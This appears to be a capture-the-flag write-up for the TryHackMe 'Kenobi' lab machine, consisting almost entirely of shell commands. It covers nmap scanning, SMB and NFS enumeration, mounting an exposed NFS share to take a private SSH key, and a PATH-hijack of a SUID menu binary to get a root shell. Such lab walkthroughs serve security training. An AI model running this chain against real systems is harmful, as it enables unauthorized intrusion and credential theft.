# Kenobi

## Scanning

```bash
sudo nmap -p- -sS --min-rate 5000 -vvv --open 10.10.229.155 -oG allports
```

![12345](12345.png)

## smb

```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.229.155
```

![03291548](03291548.png)

```bash
smbclient //10.10.229.155/anonymous
smbget -R smb://10.10.229.155/anonymous
```

![03291551](03291551.png)

![03291552](03291552.png)

```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.229.155
```

![03291559](03291559.png)

```bash
telnet 10.10.229.155 21
```

![03291615](03291615.png)

```bash
mkdir /mnt/kenobiNFS
sudo mount 10.10.229.155:/var /mnt/kenobiNFS
cd /mnt/kenobiNFS
cd tmp
cp id_rsa ~/Documentos/TryHackMe/Kenobi/content/id_rsa
umount /mnt/kenobiNFS
```

![03291630](03291630.png)![03291632](03291632.png)

```bash
sudo ssh -i id_rsa kenobi@10.10.229.155
```

![03291639](03291639.png)

```bash
echo "/bin/bash" > curl
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/menu
# press 1
```

![03291652](03291652.png)